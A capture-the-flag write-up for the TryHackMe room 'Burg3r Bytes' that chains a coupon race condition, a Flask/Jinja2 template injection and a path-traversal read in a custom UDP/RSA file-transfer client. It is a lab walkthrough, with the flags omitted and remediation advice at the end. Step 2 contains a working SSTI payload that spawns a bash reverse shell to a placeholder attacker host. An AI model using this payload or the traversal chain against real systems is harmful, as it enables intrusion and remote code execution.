# TryHack3M: Burg3r Bytes — TryHackMe Writeup

> **Room:** [TryHack3M: Burg3r Bytes](https://tryhackme.com/room/tryhack3mburg3rbytes) · **Difficulty:** Medium
> **Category:** Web / Business-logic (race condition → SSTI → custom-protocol traversal)
> **Author of writeup:** 0xnyx
> **Goal:** Two flags — abuse a checkout coupon race + SSTI for the app flag, then reverse a custom UDP protocol for the host flag.
> _(Confirm the room link above — it may differ for the event edition.)_

> ⚠️ In line with TryHackMe's write-up policy, **no flags are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**.

---

## Step 1 — App flag, part A (coupon race condition)

**Do** — The fast-food checkout applies a discount code once. Test whether applying the *same* code from two simultaneous requests double-counts it (a TOCTOU race): the server checks "is this code used?" and marks it used as separate, non-atomic steps.

```
# Burp: duplicate the "apply discount" request into a tab group,
# then "Send group in parallel" (single-packet / last-byte sync).
```

**You get** — The discount stacks multiple times, dropping the price below the intended floor.

**Why / what next** — The check (is-code-valid) and the write (mark-code-used) aren't atomic, so parallel requests all pass the check before any marks it used. This unlocks the checkout path we need to reach the receipt/certificate page.

---

## Step 2 — App flag, part B (Flask SSTI → RCE)

**Do** — The checkout **Name** field is rendered unsafely on the receipt/certificate page. Fingerprint it.

```
Name = {{7*7}}   -> receipt shows 49
```

**You get** — `49` ⇒ server-side template injection in **Flask/Jinja2**.

**Why / what next** — Climb the Jinja2 object graph to `os.popen` for RCE, then a reverse shell (nc listener first):

```
Name = {{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1"').read() }}
```

**You get** — A shell in the app container → **web app flag**.

---

## Step 3 — Host flag (reverse a custom UDP/RSA protocol)

**Do** — On the box, find the cron/client that talks to the Docker gateway.

```bash
cat /app/cron/client_py.py
# a TFTP-like UDP client to 172.17.0.1:69
# reads are RSA-PSS *signed*, writes are RSA/PKCS1_OAEP *encrypted*
```

**You get** — A custom file-transfer protocol with a **path-traversal read primitive** — the read path isn't constrained to a base directory.

**Why / what next** — Reuse the client's own signing key/logic to request a traversal path (`../../../<host file>`) and pull a file off the **host** through the gateway service → **host flag**.

```bash
# adapt client_py.py: set the read path to ../../../path/to/host_flag
python3 client_py.py   # with the traversal path
```

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Coupon race condition (parallel send) | Reach checkout below price floor |
| 2 | Flask/Jinja2 SSTI in Name field | RCE → app flag |
| 3 | Reverse custom UDP/RSA client → path traversal read | Host flag |

## Lessons

- **Race conditions** are a check-then-act gap — Burp's "send group in parallel" is the whole exploit.
- A reflected field on a receipt/cert page is a classic **SSTI** sink; `{{7*7}}` confirms it, `cycler.__init__.__globals__.os` reaches RCE.
- When a box ships a **custom protocol client**, read it — its own keys + a missing path check give you a file-read primitive across the container boundary.

## Remediation

- Make coupon redemption atomic (DB transaction / unique constraint / lock).
- Never render user input as a template — pass it as data.
- Constrain file-transfer paths to a base directory (reject `..`); authenticate the protocol properly.

---

*Write-up for TryHackMe — TryHack3M: Burg3r Bytes.*
